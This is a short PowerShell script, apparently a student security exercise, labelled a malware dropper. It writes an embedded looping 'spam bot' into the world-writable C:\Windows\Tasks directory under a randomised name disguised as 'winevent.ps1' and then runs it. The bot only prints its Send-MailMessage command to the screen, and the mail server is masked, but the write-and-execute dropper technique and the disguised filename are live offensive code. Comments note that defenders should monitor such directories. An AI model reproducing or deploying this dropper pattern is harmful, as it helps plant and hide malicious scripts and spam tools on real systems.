# Dropper for malware 

# Send an email using powershell 

# Message Body 

$writeSbot = @'
$toSend = @('ciaran.byrne@mymail.chammplain.edu','nekrotic.protonmail.com','ciaran@nekrotic.co.uk')

$msg = "Hello" 

while ($true) {

    foreach ($email in $toSend) {
        # Send the email 
    
        Write-Host "Send-MailMessage -From 'ciaran.byrne@mymail.champlain.edu' -To $email -Subject 'Spam Test' -Body $msg -SmtpServer X.X.X.X"
        
        start-sleep 1
    }
}
'@

# Tasks is a common windows directory with write access regardless of user executing on the system
$sbDir = 'C:\Windows\Tasks\'

# This is typical alongside other direcotries that have write access to them for malware droppers to download malware and tools to and should be monitored by security teams

# Create a random number to add to the file 

$sbRand = Get-Random -Minimum 1000 -Maximum 1999 

# Create the file and location to save the bot

$file = $sbDir + $sbRand + 'winevent.ps1'

# Write the bot 

$writeSbot | out-file -FilePath $file 

# Execute file 

Invoke-Expression $file